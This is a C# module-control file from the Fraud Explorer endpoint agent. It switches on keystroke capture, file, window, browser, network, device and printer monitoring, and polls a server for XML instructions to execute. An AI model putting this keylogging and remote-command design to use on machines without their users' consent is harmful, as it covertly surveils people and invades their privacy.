/*
 * The Fraud Explorer
 * http://www.thefraudexplorer.com/
 *
 * Copyright (c) 2016 The Fraud Explorer
 * email: support@thefraudexplorer.com
 * Licensed under GNU GPL v3
 * http://www.thefraudexplorer.com/License
 *
 * Date: 2016-06-30 15:12:41 -0500 (Wed, 30 Jun 2016)
 * Revision: v0.9.6-beta
 *
 * Description: Module control
 */

using System;
using TFE_core.Database;
using TFE_core.Networking;
using TFE_core.Analytics;
using System.Threading;
using System.IO;

namespace TFE_core.Config
{
    /// <summary>
    ///Modules control
    /// </summary>

    #region Modules control

    class Modules { }

    public class modulesControl
    {
        TextAnalytics KeyboardListener = new TextAnalytics();
        System.Threading.Timer WaTimer, BrowserTimer, XMLTimer;

        public void startModules()
        {
            // Module Load: Text Analytics

            if (SQLStorage.retrievePar(Settings.TAFLAG) == "1")
            {
                TextAnalyticsLogger.Setup_textAnalytics();
                GC.KeepAlive(KeyboardListener);
                KeyboardListener.KeyDown += new RawKeyEventHandler(KBHelpers.KeyboardListener_KeyDown);
            }

            // Module Load: Filesystem Analytics

            if (SQLStorage.retrievePar(Settings.FAFLAG) == "1")
            {
                FileSystemWatcher mainDrive = new FileSystemWatcher();
                FilesystemAnalyticsLogger.Setup_fileSystemAnalytics();
                FileAnalytics.FileActivityWatcherAnalytics("start", Settings.MainDrive, mainDrive);
            }

            // Module Load: Application Analytics

            if (SQLStorage.retrievePar(Settings.AAFLAG) == "1")
            {
                ApplicationsAnalyticsLogger.Setup_applicationsAnalytics();       
                WaTimer = new System.Threading.Timer(new TimerCallback(ApplicationAnalyticsTimer), null, 0, (long)Convert.ToInt64(500));               
            }

            // Module Load: Browsing Analytics

            if (SQLStorage.retrievePar(Settings.BAFLAG) == "1")
            {
                BrowsingAnalyticsLogger.Setup_browsingAnalytics();
                BrowserTimer = new System.Threading.Timer(new TimerCallback(BrowserAnalyticsTimer), null, 0, (long)Convert.ToInt64(1000));
            }

            // Module Load: Network Analytics

            if (SQLStorage.retrievePar(Settings.NAFLAG) == "1")
            {
                NetworkAnalyticsLogger.Setup_networkAnalytics();
                NetworkEvents.NetworkAnalytics();
            }

            // Module Load: Device Analytics

            if (SQLStorage.retrievePar(Settings.DAFLAG) == "1")
            {
                DevicesAnalyticsLogger.Setup_devicesAnalytics();
                DevicesEvents.DevicesAnalytics();
            }

            // Module Load: Printer Analytics

            if (SQLStorage.retrievePar(Settings.PAFLAG) == "1")
            {
                PrinterAnalyticsLogger.Setup_printerAnalytics();
                PrinterEventWatcherAsync printersWatcher = new PrinterEventWatcherAsync();
            }

            // Start XML reader
                  
            XMLTimer = new System.Threading.Timer(new TimerCallback(EnTimer), null, 0, (long)Convert.ToInt64(SQLStorage.retrievePar(Settings.HEARTBEAT)));
        }

        // Online checks timer

        XMLReader xdoc = new XMLReader();
        void EnTimer(object obj)
        {
            
            try
            {
                if (Network.Online())
                {
                    Network.UpdateState(Common.OSVersion());
                    xdoc.GetXML();
                    xdoc.ExecuteXML();
                }
            }
            catch { }
        }

        // Applications Analytics timer

        void ApplicationAnalyticsTimer(object obj)
        {
            try
            {
                WindowEvents.LogCurrentWindowInformation();
            }
            catch { }
        }

        // Browsing Analytics timer

        void BrowserAnalyticsTimer(object obj)
        {
            try
            {
                BrowsersEvents.BrowserProcess(Settings.GoogleChrome_Browser);
                BrowsersEvents.BrowserProcess(Settings.MozillaFirefox_Browser);
            }
            catch { }
        }
    }

    #endregion
}
